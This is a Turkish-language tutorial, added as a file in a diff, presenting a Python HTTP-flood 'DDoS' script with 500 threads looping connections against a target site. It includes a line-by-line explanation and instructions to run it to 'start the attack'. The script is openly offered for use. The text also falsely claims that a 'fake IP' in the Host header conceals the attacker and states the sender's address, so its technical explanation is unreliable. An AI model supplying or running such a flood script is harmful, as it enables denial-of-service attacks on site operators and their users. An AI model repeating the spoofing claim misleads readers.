@@ -1,0 +1,78 @@
+PYTHONLA DDOS SALDIRISI YAPMAK
+
+Bu, yazmış olduğum kod Python dilinde 
+yazılmış bir kod parçasıdır. Bu kod, 
+bir web sitesine sahte IP adresi kullanarak 
+çok sayıda HTTP isteği göndererek bir DDoS 
+(Dağıtık Hizmet Engelleme) saldırısı gerçekleştirmeye 
+çalışır. Bu tür saldırılar, web sitesinin sunucularını 
+aşırı yükleyerek hizmet vermelerini engellemeyi amaçlar. 
+Linkini yazmış olduğum siteyse sadece bir örnek olup bu
+link makalelerde kullanılmak için yazılmış ve kullanılmasına 
+müsaade edilmiş bir linktir. 
+
+import socket
+import threading
+
+target = 'www.example.com' # saldırı yapılacak web sitesi
+port = 80 # web sitesinin port numarası
+fake_ip = '182.21.20.32' # sahte IP adresi
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500): # 500 adet paralel bağlantı oluştur
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+Bu kodu açıklamak için, önce her satırın ne yaptığını anlatayım:
+- `import socket` : Bu satır, Python programının ağ bağlantısı 
+kurabilmesi için `socket` adlı bir modülü içe aktarır.
+- `import threading` : Bu satır, Python programının birden fazla 
+iş parçacığı (thread) oluşturabilmesi için `threading` adlı bir modülü içe aktarır.
+- `target = 'www.example.com'` : Bu satır, saldırı yapılacak web sitesinin adını `target` 
+adlı bir değişkene atar.
+- `port = 80` : Bu satır, web sitesinin port numarasını `port` adlı bir değişkene atar. 
+Genellikle web siteleri 80 numaralı portu kullanır.
+- `fake_ip = '182.21.20.32'` : Bu satır, sahte bir IP adresini `fake_ip` adlı bir 
+değişkene atar. Bu IP adresi, saldırıyı gerçekleştirenin kimliğini gizlemek için kullanılır.
+- `def attack():` : Bu satır, saldırı işlemini gerçekleştiren bir fonksiyon tanımlar. 
+Fonksiyonun adı `attack` olarak belirlenir.
+- `while True:` : Bu satır, fonksiyonun içindeki kodun sürekli olarak tekrarlanmasını 
+sağlar. Bu, web sitesine sürekli olarak istek göndermek için yapılır.
+- `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)` : Bu satır, bir ağ bağlantısı 
+oluşturmak için bir `socket` nesnesi oluşturur. `socket.AF_INET` parametresi, 
+IPv4 protokolünü kullanacağını belirtir. `socket.SOCK_STREAM` parametresi,
+TCP protokolünü kullanacağını belirtir.
+- `s.connect((target, port))` : Bu satır, oluşturulan `socket` nesnesini, 
+hedef web sitesinin adresi ve port numarası ile bağlar.
+- `s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))` : Bu satır, bağlanılan web sitesine bir 
+HTTP isteği gönderir. Bu istek, web sitesinin ana sayfasını (`/`) getirmesini ister. `GET /` kısmı, isteğin türünü ve 
+istenen kaynağı belirtir. `target` kısmı, web sitesinin adını ekler. `HTTP/1.1\r\n` kısmı, isteğin protokolünü ve bir 
+satır sonu karakteri belirtir. `.encode('ascii')` kısmı, isteği ASCII formatına dönüştürür. `(target, port)` kısmı,
+isteğin gönderileceği adresi ve port numarasını belirtir.
+- `s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))` : Bu satır, bağlanılan web sitesine 
+bir HTTP başlığı gönderir. Bu başlık, isteği gönderenin IP adresini (`Host`) belirtir. Bu IP adresi, sahte bir IP 
+adresi olarak belirlenmiştir. `\r\n\r\n` kısmı, başlığın sonunu ve boş bir satırı belirtir. Diğer kısımlar, önceki 
+satırla aynı işlevi görür.
+- `s.close()` : Bu satır, bağlantıyı kapatır.
+- `for i in range(500):` : Bu satır, 500 kez tekrarlanacak bir döngü başlatır. Bu, 500 adet paralel bağlantı 
+oluşturmak için yapılır.
+- `thread = threading.Thread(target=attack)` : Bu satır, her bir bağlantı için bir iş parçacığı oluşturur. 
+Oluşturulan iş parçacığı, `attack` fonksiyonunu çalıştıracaktır.
+- `thread.start()` : Bu satır, oluşturulan iş parçacığını başlatır.
+Bu kodun amacı, web sitesine sahte IP adresi kullanarak çok sayıda HTTP isteği göndererek bir
+DDoS saldırısı gerçekleştirmektir. Bu tür saldırılar, web sitesinin sunucularını aşırı yükleyerek
+hizmet vermelerini engellemeyi amaçlar. 
+
+Bu kodu çalıştırmak için, Python yüklü bir bilgisayara ihtiyacınız var. Python, bir programlama 
+dili ve bir yazılım platformudur. Python'i indirip kurun.  Python kurduktan sonra, bu kodu bir 
+metin editörü ile açabilir ve kaydedebilirsiniz. Örneğin, `saldiri.py` adında bir dosya
+oluşturabilirsiniz. Daha sonra, bir komut satırı veya terminal penceresi açarak, bu dosyayı 
+çalıştırabilirsiniz. Örneğin, Windows'ta `python saldiri.py` komutunu yazabilirsiniz. Bu komut,
+kodu çalıştıracak ve web sitesine saldırı başlatacaktır.
